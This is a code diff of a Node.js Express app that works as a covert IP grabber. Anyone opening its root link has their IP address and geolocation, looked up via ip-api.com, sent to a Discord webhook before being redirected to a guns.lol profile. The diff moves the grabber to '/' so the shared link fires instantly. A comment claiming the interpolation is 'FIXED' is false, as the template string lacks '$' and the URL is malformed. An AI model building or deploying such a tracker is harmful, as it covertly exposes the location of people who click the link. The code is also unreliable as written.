@@ -3,8 +3,9 @@ const axios = require('axios');
 const app = express();
 
 const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK;
-const REDIRECT_URL = process.env.REDIRECT_URL || 'https://guns.lol/xsaint'; 
+const REDIRECT_URL = process.env.REDIRECT_URL || 'https://guns.lol'; 
 
+// Changed path to '/' so your main link works instantly without typing /visit
 app.get('/', async (req, res) => {
     let clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
     
@@ -20,6 +21,7 @@ app.get('/', async (req, res) => {
 
     if (DISCORD_WEBHOOK_URL) {
         try {
+            // FIXED: Uses proper backticks for the variable injection
             const geoResponse = await axios.get(`http://ip-api.com{clientIp}?fields=61439`);
             const geoData = geoResponse.data;
 
@@ -48,8 +50,6 @@ app.get('/', async (req, res) => {
         } catch (error) {
             console.error("Geo Data Retrieval Error:", error.message);
         }
-    } else {
-        console.warn("Configuration Error: DISCORD_WEBHOOK variable is missing.");
     }
 
     res.redirect(302, REDIRECT_URL);
